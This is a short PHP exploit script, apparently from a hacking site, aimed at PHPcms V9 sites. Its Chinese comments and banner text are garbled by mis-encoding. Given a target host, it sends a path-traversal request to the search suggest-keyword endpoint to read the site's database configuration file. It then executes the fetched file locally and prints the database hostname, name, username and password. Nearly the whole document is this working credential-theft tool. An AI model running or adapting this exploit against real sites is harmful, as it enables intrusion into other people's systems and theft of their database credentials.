<?php
/**
 * PHPcms V9 �����ļ���ȡ©����⹤��
 * ������: www.hack70.com
 * qqȺ:20530356 ����:570860
 *
 * ע�Ȿ�������ѧϰ�ο����������ڷǷ�����
 * �������Ը����뱾���޹أ�
 */

function showInfo() {

print '
***********************************************
* PHPcmsV9 Read All File ExpTool By:[h.e.z]ר��
*
* ������: www.hack70.com
*
* qqȺ:20530356 ����:570860
*
* Example: php exp.php wwww.phpcms.cn
***********************************************
';
}

$exp = '/index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=../../caches/configs/database.php';

//file_get_contents(''.$exp);
if(count($argv) < 2){
 showInfo();
}else{

 $exp = 'http://'.$argv[1].$exp;
 $data = @file_get_contents($exp);
 @file_put_contents('expDatabase.php', $data);
 if(strstr($data,'<html>')){
 showInfo();
 echo 'Not found !';
 exit();
 };
 $database = include 'expDatabase.php';
 showInfo();
 $out = 'HostName:'.$database['default']['hostname']."\n";
 $out .='DataBase:'. $database['default']['database']."\n";
 $out .='UserName:'. $database['default']['username']."\n";
 $out .='Password:'. $database['default']['password']."\n";
 if(!empty($database)){
 echo "Found it! :\n\n";
 echo $out;
 }
 @unlink('expDatabase.php');
}?>